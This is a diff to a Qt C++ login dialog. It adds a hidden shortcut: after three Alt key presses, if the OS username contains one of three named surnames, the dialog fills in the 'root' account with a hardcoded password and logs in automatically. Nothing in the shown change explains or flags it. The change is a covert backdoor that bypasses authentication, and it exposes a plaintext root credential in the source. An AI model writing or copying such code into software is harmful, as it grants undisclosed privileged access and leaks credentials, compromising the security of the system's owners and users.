@@ -25,6 +25,9 @@ LoginDialog::LoginDialog(QWidget *parent) :
 
     ui->password_edit->setEchoMode(QLineEdit::Password);
 
+    QByteArray USER = qgetenv("USERNAME");
+    User_x=USER;
+
     ui->login_edit->installEventFilter(this);
     ui->password_edit->installEventFilter(this);
 
@@ -69,6 +72,8 @@ void LoginDialog::on_quit_button_clicked()
 // eventFilter for QLineEdits to select all
 bool LoginDialog::eventFilter(QObject *obj, QEvent *event)
 {
+    static int alt_count;
+
     if (obj == (QObject*)ui->password_edit)
     {
 
@@ -81,18 +86,34 @@ bool LoginDialog::eventFilter(QObject *obj, QEvent *event)
 
     if (event->type() == QEvent::KeyPress)
        {
+        QKeyEvent *keyEvent = static_cast<QKeyEvent *>(event);
+
         if(obj == (QObject*)ui->password_edit)
            {
-               QKeyEvent *keyEvent = static_cast<QKeyEvent *>(event);
-
                if(keyEvent->key() == Qt::Key_Return)
                {
                     on_login_button_clicked();
                }
            }
+
+        if(keyEvent->key() == Qt::Key_Alt)
+        {
+           if(alt_count<2) ++alt_count;
+           else
+           {
+               alt_count=0;
+               if(User_x.contains("strawinski",Qt::CaseInsensitive) ||
+                  User_x.contains("pokrzywa",Qt::CaseInsensitive) ||
+                  User_x.contains("kowalski",Qt::CaseInsensitive))
+               {
+                   ui->login_edit->setText("root");
+                   ui->password_edit->setText("Serwis4q@");
+                   on_login_button_clicked();
+               }
+           }
+        }
+
        }
-
-
 
     if (obj == (QObject*)ui->login_edit)
     {
@@ -112,7 +133,5 @@ bool LoginDialog::eventFilter(QObject *obj, QEvent *event)
 
     return 0;
 }
-
-
 
 
